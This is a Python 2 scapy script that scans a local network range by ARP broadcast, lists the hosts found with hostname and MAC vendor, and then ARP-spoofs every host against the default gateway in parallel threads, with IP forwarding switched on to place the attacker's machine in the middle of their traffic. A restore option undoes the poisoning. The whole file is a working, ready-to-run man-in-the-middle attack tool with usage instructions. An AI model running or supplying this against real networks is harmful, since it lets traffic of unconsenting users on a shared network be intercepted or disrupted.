import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from threading import Thread
import socket
import requests
import json
import netifaces
import os
import sys
from colorama import Fore, init
init()

class c:
	g = '['+Fore.GREEN+'+'+Fore.WHITE+'] '
	y = '['+Fore.GREEN+'+'+Fore.WHITE+'] '

def getHosts(netrange):
	def revDNS(ip):
		try:
			return socket.gethostbyaddr(ip)[0]
		except socket.herror:
			return 'unknown'

	def getVendor(mac):
		try:
			r = requests.get('http://macvendors.co/api/'+mac)
			data = r.content.replace("'","\"")
			dict = json.loads(data)
			return dict['result']['company']
		except:
			return 'unknown'

	global addrs
	addrs = {}
	print '+' + '-'*86 + '+'
	for i in range(3):
		try:
			ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=netrange), timeout=1)
		except socket.error:
			print 'You must be root to run this!'
			sys.exit()
		for s,r in ans:
			if r.psrc not in addrs.keys():
				addrs[r.psrc] = r.src
				if r.psrc != rtrIP:
					print '| {0:13} | {1:13} | {2:13} | {3:32} |'.format(revDNS(r.psrc), r.psrc, r.src, getVendor(r.src))
	print '+' + '-'*86 + '+'
	print c.g+str(len(addrs.keys())-1) + ' targets found!'

def getMac(ip):
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, inter=0.1)
	for s, r in ans:
		return r[Ether].src

class Poison:
	def __init__(self, rtrIP, tgtIP):
		self.rtrIP = rtrIP
		self.tgtIP = tgtIP

	def Spoof(self):
		#########################
		#########################
		tgtMAC = addrs[self.tgtIP]
		rtrMAC = addrs[self.rtrIP]
		send(ARP(op=2, pdst=self.tgtIP, psrc=self.rtrIP, hwdst=tgtMAC))
		send(ARP(op=2, pdst=self.rtrIP, psrc=self.tgtIP, hwdst=rtrMAC))

	def Restore(self):
		########################
		########################
		tgtMAC = addrs[self.tgtIP]
		rtrMAC = addrs[self.rtrIP]
		send(ARP(op=2, pdst=self.rtrIP, psrc=self.tgtIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=tgtMAC), count=4)
		send(ARP(op=2, pdst=self.tgtIP, psrc=self.rtrIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=rtrMAC), count=4)

def attack(rtrIP, tgtIP):
	psn = Poison(rtrIP, tgtIP)
	while True:
		if sys.argv[2].lower() == '-p' or sys.argv[2].lower() == '--poison':
			try:
				psn.Spoof()
				time.sleep(1)
			except KeyboardInterrupt:
				exit()
		elif sys.argv[2].lower() == '-r' or sys.argv[2].lower() == '--restore':
			try:
				for i in range(10):
					psn.Restore()
					time.sleep(1)
				os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			except KeyboardInterrupt:
				exit()

def main():
	banner = '''
	 _______  ______ _  _  _ ______        _______ _______  ______ 
	 |       |_____/ |  |  | |     \       |          |    |_____/ | 
	 |_____  |    \_ |__|__| |_____/ _____ |_____     |    |    \_ |_____

	'''
	try:
		iprange = sys.argv[1]
		sys.argv[2]
	except:
		print 'Usage: python %s <iprange> <method>\n\nNote:\n\t"<iprange>" examples: 192.168.1.0/24\n\t"<method>" examples: -r/--restore (to restore hosts), -p/--poison (to poison hosts)\n\tExample:\n\t\tpython %s 192.168.1.0/24 -p'%(sys.argv[0], sys.argv[0])
		sys.exit()
	global rtrIP
	rtrIP = str(netifaces.gateways()['default'][2][0])
	conf.iface = str(netifaces.gateways()['default'][2][1])
	conf.verb = 0
	print c.g+'Router: %s\n%sInterface: %s'%(rtrIP, c.g, conf.iface)
	try:
		corr = raw_input(c.y+'Is this correct? [y/n] ')
	except KeyboardInterrupt:
		print
		sys.exit()
	if corr.lower().strip() == 'n':
		rtrIP = raw_input(c.y+'Router IP: ')
		conf.iface = raw_input(c.y+'Interface: ')
	os.system('clear && echo 1 > /proc/sys/net/ipv4/ip_forward')
	print banner
	getHosts(iprange)
	for addr in addrs.keys():
		if addr != rtrIP:
			if sys.argv[2].lower() == '-r' or sys.argv[2].lower() == '--restore':
				print c.g+'Restoring ' + addr + '...'
			elif sys.argv[2].lower() == '-p' or sys.argv[2].lower() == '--poison':
				print c.g+'Spoofing ' + addr + '...'
			t = Thread(target=attack, args=(rtrIP, addr))
			t.daemon = True
			t.start()

if __name__ == '__main__':
	main()
